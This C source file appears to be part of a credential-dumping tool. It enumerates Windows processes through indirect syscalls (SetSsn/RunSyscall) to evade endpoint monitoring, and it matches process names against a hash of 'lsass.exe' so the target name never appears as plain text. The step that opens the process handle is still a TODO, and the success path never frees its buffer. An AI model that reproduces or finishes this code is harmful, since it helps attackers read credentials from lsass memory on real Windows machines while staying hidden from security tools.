#include "GetProc.h"

identity_t lsassHash = IDENTITY("lsass.exe");

NTSTATUS GetProcHandle(IN DWORD ProcHash, OUT PHANDLE hProc) {
    PVOID       pBuffer     = NULL;
    ULONG       cbBuffer    = 131072;
    HANDLE      hHeap       = NULL;
    NTSTATUS    ntStatus    = 0x00;
    PCHAR       utf8Str     = NULL;

    CLIENT_ID                   clientId;
    OBJECT_ATTRIBUTES           objAttributes;
    PSYSTEM_PROCESS_INFORMATION pSysProcInfo;

    hHeap = GetProcessHeap();
    if (hHeap == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
        printf("[!] GetProcessHeap failed with error: %lu [%d]\n", GetLastError(), __LINE__);
#endif
        return STATUS_UNSUCCESSFUL;
    }

    while(TRUE) {
        printf("[i] Current buffer size is: %lu bytes\n", cbBuffer);
        pBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cbBuffer);
        if (!pBuffer) {
#ifdef DEBUG
            printf("[!] HeapAlloc failed with error: %lu [%d]\n", GetLastError(), __LINE__);
#endif
            goto _CLEAN_UP;
        }
        SetSsn(g_SyscallApi.NtQuerySystemInformation.dwSsn, g_SyscallApi.NtQuerySystemInformation.pSyscallInstAddress);
        ntStatus = RunSyscall(5, pBuffer, cbBuffer, &cbBuffer);
        if (ntStatus == STATUS_INFO_LENGTH_MISMATCH) {
#ifdef DEBUG
            printf("[i] NtQuerySystemInformation failed with error: STATUS_INFO_LENGTH_MISMATCH, increasing buffer size...\n");
            printf("[i] Current buffer size is: %lu bytes\n", cbBuffer);
#endif
            HeapFree(hHeap, NULL, pBuffer);
            cbBuffer *= 2;
        } else if (!NT_SUCCESS(ntStatus)) {
#ifdef DEBUG
            printf("[!] NtQuerySystemInformation failed with error: %#010x [%d]\n", ntStatus, __LINE__);
#endif
            goto _CLEAN_UP;
        } else {
            break;
        }
    }

    pSysProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
    while (pSysProcInfo->NextEntryOffset) {
#ifdef DEBUG
        printf("\nProcess: %ls | PID: %d\n", pSysProcInfo->ImageName.Buffer, pSysProcInfo->ProcessId);
#endif
        utf8Str = UnicodeStringToUtf8(&pSysProcInfo->ImageName);
        if (IdentityRuntime(utf8Str) == ProcHash) {
            // TODO: Call NtOpenProcess and obtain process handle
        }
        pSysProcInfo = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pSysProcInfo + pSysProcInfo->NextEntryOffset);
    }
    return STATUS_SUCCESS;

    _CLEAN_UP:
    if (pBuffer) HeapFree(hHeap, NULL, pBuffer);
    return STATUS_UNSUCCESSFUL;
}